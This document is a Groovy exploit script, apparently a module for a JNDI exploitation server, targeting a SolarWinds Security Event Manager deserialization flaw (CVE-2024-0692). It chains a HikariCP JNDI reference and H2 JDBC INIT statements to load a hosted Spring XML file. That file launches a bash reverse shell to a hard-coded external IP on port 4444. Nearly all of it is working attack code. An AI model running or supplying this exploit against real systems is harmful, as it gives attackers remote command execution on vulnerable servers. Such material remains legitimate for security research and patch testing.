import map.jndi.server.WebServer

import javax.naming.Reference
import javax.naming.StringRefAddr

// SolarWinds Security Event Manager AMF Deserialization RCE (CVE-2024-0692)
// instantiate ClassPathXmlApplicationContext

def list = []

// drop the previous alias if exists
list << "DROP ALIAS IF EXISTS INVOKE_CONSTRUCTOR"
list << "DROP ALIAS IF EXISTS INVOKE_METHOD"
list << "DROP ALIAS IF EXISTS URI_CREATE";
list << "DROP ALIAS IF EXISTS CLASS_FOR_NAME"

// alias some external Java methods
list << "CREATE ALIAS INVOKE_CONSTRUCTOR FOR 'org.apache.commons.beanutils.ConstructorUtils.invokeConstructor(java.lang.Class, java.lang.Object)'"
list << "CREATE ALIAS INVOKE_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object)'"
list << "CREATE ALIAS URI_CREATE FOR 'java.net.URI.create(java.lang.String)'"
list << "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)'"

// Spring XML content
def content = '''<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value><![CDATA[bash -i >& /dev/tcp/100.109.34.110/4444 0>&1]]></value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
'''

// host the xml on a web server
def server = WebServer.getInstance()
server.serveFile("/exp.xml", content.getBytes())

def xml_url = "http://$server.ip:$server.port/exp.xml"

// invoke URI.create() to create a URI object
list << "SET @uri=URI_CREATE('$xml_url')"
// invoke uri.toString() to transform the type of `xml_url` (from java.lang.String to java.lang.Object) to avoid H2 SQL convert error
// because the return type of INVOKE_METHOD is java.lang.Object
list << "SET @xml_url_obj=INVOKE_METHOD(@uri, 'toString', NULL)"
// instantiate ClassPathXmlApplicationContext
list << "SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext')"
// the second parameter of INVOKE_CONSTRUCTOR requires java.lang.Object, so we use `xml_url_obj` instead of `xml_url`
list << "CALL INVOKE_CONSTRUCTOR(@context_clazz, @xml_url_obj)"

// use INIT property to execute multi SQL statements, and each statement must be separated by `\;`
def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"

def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("jdbcUrl", url));

return ref